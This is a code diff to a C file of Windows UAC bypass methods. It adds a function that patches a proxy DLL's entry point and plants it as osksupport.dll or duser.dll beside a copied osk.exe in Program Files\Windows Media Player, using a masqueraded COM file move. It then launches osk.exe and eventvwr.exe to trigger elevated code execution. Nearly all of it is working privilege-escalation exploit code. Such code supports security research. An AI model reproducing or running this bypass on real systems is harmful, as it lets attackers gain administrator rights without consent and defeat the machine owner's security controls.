@@ -4,9 +4,9 @@
 *
 *  TITLE:       HYBRIDS.C
 *
-*  VERSION:     2.70
+*  VERSION:     2.71
 *
-*  DATE:        19 Apr 2017
+*  DATE:        06 May 2017
 *
 *  Hybrid UAC bypass methods.
 *
@@ -1602,5 +1602,139 @@ BOOL ucmWow64LoggerMethod(
         _strcat(szTarget, WOW64LOG_DLL);
         DeleteFile(szTarget);
     }
+    return bResult;
+}
+
+/*
+* ucmUiAccessMethod
+*
+* Purpose:
+*
+* Bypass UAC using uiAccess(true) application.
+* Original method source
+* https://habrahabr.ru/company/pm/blog/328008/
+*
+*/
+BOOL ucmUiAccessMethod(
+    PVOID ProxyDll,
+    DWORD ProxyDllSize
+)
+{
+    BOOL bResult = FALSE, bCond = FALSE;
+    SIZE_T Length;
+    DWORD DllVirtualSize;
+    LPWSTR lpEnv, lpTargetDll;
+    PVOID EntryPoint, DllBase;
+    PIMAGE_NT_HEADERS NtHeaders;
+    UNICODE_STRING uStr;
+    WCHAR szTarget[MAX_PATH * 2];
+    WCHAR szSource[MAX_PATH * 2];
+
+    do {
+
+        //
+        // There is no osksupport.dll in Windows 7.
+        //
+        if (g_ctx.dwBuildNumber < 9200)
+            lpTargetDll = DUSER_DLL;
+        else
+            lpTargetDll = OSKSUPPORT_DLL;
+
+        //
+        // Replace default Fubuki dll entry point with new.
+        //
+        NtHeaders = RtlImageNtHeader(ProxyDll);
+        if (NtHeaders == NULL)
+            break;
+
+        DllVirtualSize = 0;
+        DllBase = PELoaderLoadImage(ProxyDll, &DllVirtualSize);
+        if (DllBase) {
+
+            //
+            // Get the new entrypoint.
+            //
+            EntryPoint = PELoaderGetProcAddress(DllBase, "_FubukiProc1");
+            if (EntryPoint == NULL)
+                break;
+
+            //
+            // Set new entrypoint and recalculate checksum.
+            //
+            NtHeaders->OptionalHeader.AddressOfEntryPoint =
+                (ULONG)((ULONG_PTR)EntryPoint - (ULONG_PTR)DllBase);
+
+            NtHeaders->OptionalHeader.CheckSum =
+                supCalculateCheckSumForMappedFile(ProxyDll, ProxyDllSize);
+
+            VirtualFree(DllBase, 0, MEM_RELEASE);
+
+        }
+        else
+            break;
+
+        //
+        // Drop modified fubuki.dll to the %temp%
+        //
+        RtlSecureZeroMemory(szSource, sizeof(szSource));
+        _strcpy(szSource, g_ctx.szTempDirectory);
+        _strcat(szSource, lpTargetDll);
+        if (!supWriteBufferToFile(szSource, ProxyDll, ProxyDllSize))
+            break;
+
+        //
+        // Build target path in g_lpIncludePFDirs
+        //
+        uStr.Buffer = NULL;
+        uStr.Length = 0;
+        uStr.MaximumLength = 0;
+        lpEnv = L"ProgramFiles=";
+        RtlInitUnicodeString(&uStr, lpEnv);
+
+        lpEnv = supQueryEnvironmentVariableOffset(&uStr);
+        if (lpEnv == NULL)
+            break;
+
+        Length = _strlen(lpEnv);
+        if ((Length == 0) || (Length > MAX_PATH))
+            break;
+
+        RtlSecureZeroMemory(&szTarget, sizeof(szTarget));
+        _strncpy(szTarget, MAX_PATH, lpEnv, MAX_PATH);
+        _strcat(szTarget, TEXT("\\"));
+        _strcat(szTarget, T_WINDOWSMEDIAPLAYER);
+        _strcat(szTarget, TEXT("\\"));
+
+        //
+        // Copy Fubuki to target directory.
+        // 
+        if (!ucmMasqueradedMoveFileCOM(szSource, szTarget))
+            break;
+
+        //
+        // Copy osk.exe to Program Files\Windows Media Player
+        //
+        RtlSecureZeroMemory(szSource, sizeof(szSource));
+        _strcpy(szSource, g_ctx.szSystemDirectory);
+        _strcat(szSource, OSK_EXE);
+        if (!ucmMasqueradedMoveCopyFileCOM(szSource, szTarget, FALSE))
+            break;
+
+        //
+        // Run uiAccess osk.exe from Program Files.
+        //
+        _strcat(szTarget, OSK_EXE);
+        if (supRunProcess2(szTarget, NULL, FALSE)) {
+            //
+            // Run eventvwr.exe as final trigger.
+            // Spawns mmc.exe with eventvwr.msc snap-in.
+            //
+            _strcpy(szTarget, g_ctx.szSystemDirectory);
+            _strcat(szTarget, EVENTVWR_EXE);
+            bResult = supRunProcess2(szTarget, NULL, FALSE);
+        }
+
+    } while (bCond);
+
     return bResult;
 }
